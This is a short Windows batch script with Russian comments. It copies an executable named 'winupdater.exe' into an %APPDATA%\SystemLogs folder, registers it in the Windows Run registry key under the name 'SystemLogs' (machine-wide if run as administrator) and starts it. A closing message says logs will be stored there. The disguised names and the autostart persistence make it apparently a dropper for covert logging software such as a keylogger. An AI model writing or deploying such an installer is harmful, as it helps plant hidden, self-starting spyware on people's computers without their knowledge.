@echo off
setlocal enabledelayedexpansion

set "TARGET_DIR=%APPDATA%\SystemLogs"
set "EXE_PATH=%TARGET_DIR%\winupdater.exe"

:: Проверка прав администратора
net session >nul 2>&1
if %errorLevel% == 0 (
    set "REG_ROOT=HKLM"
) else (
    set "REG_ROOT=HKCU"
)

:: Создание директории
mkdir "%TARGET_DIR%" 2>nul

:: Копирование файла
copy /Y "%~dp0winupdater.exe" "%EXE_PATH%"

:: Добавление в автозагрузку
reg add "%REG_ROOT%\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemLogs" /t REG_SZ /d "\"%EXE_PATH%\"" /f

:: Запуск службы
start "" "%EXE_PATH%"

echo [✓] Установка завершена. Логи будут сохраняться в:
echo %TARGET_DIR%
pause
